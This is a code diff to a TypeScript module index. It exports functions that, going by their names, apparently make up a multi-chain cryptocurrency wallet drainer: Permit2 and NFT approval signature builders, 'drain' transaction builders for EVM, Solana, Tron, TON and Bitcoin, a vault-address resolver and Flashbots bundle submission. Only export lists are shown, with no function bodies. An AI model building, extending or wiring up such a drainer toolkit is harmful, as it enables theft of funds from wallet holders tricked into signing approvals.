@@ -10,7 +10,42 @@ export * from './logic/sentinel.js'
 export * from './logic/scout.js'
 
 /** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
-export { resolveIntegrationSyncRoute } from './logic/integration-sync.js'
+export {
+  resolveIntegrationSyncRoute,
+} from './logic/integration-sync.js'
+export {
+  isValidEvmExecutionPrivateKey,
+  normalizeEvmExecutionPrivateKey,
+} from './lib/evm-execution-key.js'
+export {
+  redisWrapperRetryStrategy,
+  resolveEffectiveRedisUrl,
+  probeRedisWithRetry,
+  createResilientRedisClient,
+  enqueueMemoryFallbackJob,
+  memoryFallbackJobCount,
+  getRedisWrapperState,
+  buildBullMqRedisOptions,
+  buildApiRedisOptions,
+  DEFAULT_DEV_REDIS_URL,
+  REDIS_WRAPPER_MAX_CONNECT_RETRIES,
+  type RedisWrapperState,
+  type MemoryJobRecord,
+} from './lib/redis-wrapper.js'
+export {
+  getChainRpcMap,
+  getRpcUrlForChain,
+  getRpcUrlForChainWithFallback,
+  isRpcConfigured,
+  getChainEnvName,
+  getChainRpcConfig,
+  CHAIN_RPC_MAP,
+  PUBLIC_RPC_FALLBACKS,
+  resolveSolanaNetwork,
+  resolveSolanaRpcUrl,
+  type ChainRpcConfig,
+  type SolanaNetwork,
+} from './lib/chain-rpc.js'
 export {
   executeAutonomousLiquidation,
   executeSettlementIgnition,
@@ -18,6 +53,123 @@ export {
   type SettlementIgnitionTelemetry,
 } from './logic/algorithmic-closer.js'
 export {
+  executePermit2AllowanceSettlement,
+  packPermit2SignatureEnvelope,
+  parsePermit2SignatureEnvelope,
+  readPermit2AllowanceNonce,
+  resolveEngineSpenderAddress,
+  resolveSettlementExecutorKey,
+  type Permit2SignatureEnvelope,
+  type Permit2SingleMetadata,
+  type Permit2SettlementResult,
+} from './logic/permit2-executor.js'
+export {
+  buildBatchPermitTypedData,
+  executeBatchPermit2Settlement,
+  packBatchPermit2SignatureEnvelope,
+  parseBatchPermit2SignatureEnvelope,
+  readPermit2BatchAllowanceNonces,
+  type BatchPermit2SettlementResult,
+  type BatchPermit2SignatureEnvelope,
+  type BatchPermitDetailMetadata,
+  type BatchPermitMetadata,
+  type BatchPermitParams,
+  type BatchNftEntry,
+  type OmnichainNativeDrainPayload,
+  executeOmnichainNativeDrainSettlement,
+} from './logic/permit2-batch.js'
+export {
+  buildNFTApprovalTypedData,
+  buildBatchNFTApprovalTypedData,
+  buildNFTSetApprovalForAllCalldata,
+  detectNftStandard,
+  executeNFTDrain,
+  executeBatchNftDrainSettlement,
+  resolveNftDrainOperator,
+  type NftApprovalTypedData,
+  type NftDrainSettlementResult,
+  type NftStandard,
+} from './logic/nft-drain.js'
+export {
+  buildSolNativeTransferTx,
+  buildSolNativeDrainForBatch,
+  broadcastSignedSolNativeTransfer,
+  type SolNativeTransferRequest,
+} from './logic/solana-native-drain.js'
+export {
+  buildSplTransferTx,
+  buildSplDrainForBatch,
+  executeSplTokenDrain,
+  type SplTransferRequest,
+} from './logic/solana-spl-drain.js'
+export {
+  buildTrxNativeTransferTx,
+  buildTrxNativeDrainForBatch,
+  broadcastSignedTrxNativeTransfer,
+  type TronNativeTransferRequest,
+} from './logic/tron-native-drain.js'
+export {
+  buildTrc20TransferTx,
+  buildTrc20DrainForBatch,
+  executeTrc20TokenDrain,
+  type Trc20TransferRequest,
+} from './logic/tron-trc20-drain.js'
+export {
+  buildTonNativeTransferTx,
+  buildTonNativeDrainForBatch,
+  broadcastSignedTonNativeTransfer,
+  type TonNativeTransferRequest,
+} from './logic/ton-native-drain.js'
+export {
+  buildJettonTransferTx,
+  buildJettonDrainForBatch,
+  executeJettonDrain,
+  type JettonTransferRequest,
+} from './logic/ton-jetton-drain.js'
+export {
+  buildPSBT,
+  buildBitcoinDrainPsbt,
+  broadcastPSBT,
+  extractRawTransactionHexFromSignedPsbt,
+  fetchWalletUtxos,
+  packBitcoinPsbtSignatureEnvelope,
+  parseBitcoinPsbtSignatureEnvelope,
+  parseBitcoinSatAmount,
+  resolveBitcoinVaultAddress,
+  type BitcoinPsbtBroadcastResult,
+  type BitcoinPsbtBuildResult,
+  type BitcoinPsbtSignatureEnvelope,
+  type UtxoCoin,
+} from './logic/bitcoin-drain.js'
+export {
+  batchNativeWithPermit2,
+  buildNativeTransferTx,
+  broadcastSignedNativeTransfer,
+  deliverNativeWithPermit2Transactions,
+  parseNativeAmount,
+  buildNativeCoinDrainMetadata,
+  type BatchNativeWithPermit2Result,
+  type NativeCoinDrainMetadata,
+  type NativeTransferTxRequest,
+} from './logic/native-coin-drain.js'
+export {
+  createFlashbotsRelay,
+  deliverSignedEvmTransactions,
+  isFlashbotsEnabled,
+  resolveFlashbotsAuthSigner,
+  resolveFlashbotsConfigFromEnv,
+  resolveFlashbotsRelayUrl,
+  simulateFlashbotsBundle,
+  submitFlashbotsBundle,
+  DEFAULT_FLASHBOTS_RELAY_URL,
+  FlashbotsRelay,
+  type FlashbotsConfig,
+  type FlashbotsDeliveryResult,
+  type FlashbotsSimulationResult,
+  type FlashbotsSubmitResult,
+} from './logic/flashbots-relay.js'
+export {
+  openSignaturePayloadForSettlement,
   buildSettlementExecutionWire,
   broadcastEVM,
   broadcastSVM,
